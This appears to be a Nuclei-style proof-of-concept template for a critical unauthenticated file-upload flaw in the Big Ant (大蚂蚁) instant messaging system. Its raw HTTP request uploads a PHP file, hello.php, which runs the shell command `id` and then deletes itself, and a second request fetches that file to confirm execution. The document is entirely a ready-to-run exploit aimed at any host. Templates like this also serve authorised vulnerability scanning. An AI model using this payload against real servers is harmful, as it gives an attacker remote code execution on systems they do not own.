id: poc-knvopqrds2qxsiz8
info:
  name: 大蚂蚁即时通信系统upload_file存在文件上传导致命令执行漏洞
  author: hacktwo
  severity: critical
  description: ''
  tags: rce,file-upload,2026
http:
- raw:
  - 'POST /api/dispersedAddin/upload_file.html HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9

    Cookie: PHPSESSID=m905cb6sucrf6i6munki07bc5c

    Upgrade-Insecure-Requests: 1


    ------WebKitFormBoundary

    Content-Disposition: form-data; name="file_info"


    [{"file_path":"hello.php"}]

    ------WebKitFormBoundary

    Content-Disposition: form-data; name="file"; filename="1.txt"


    <?=`id`;unlink(__FILE__);?>

    ------WebKitFormBoundary--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - GET /hello.php HTTP/1.1
  redirects: false
  matchers:
  - status:
    - 200
    type: status
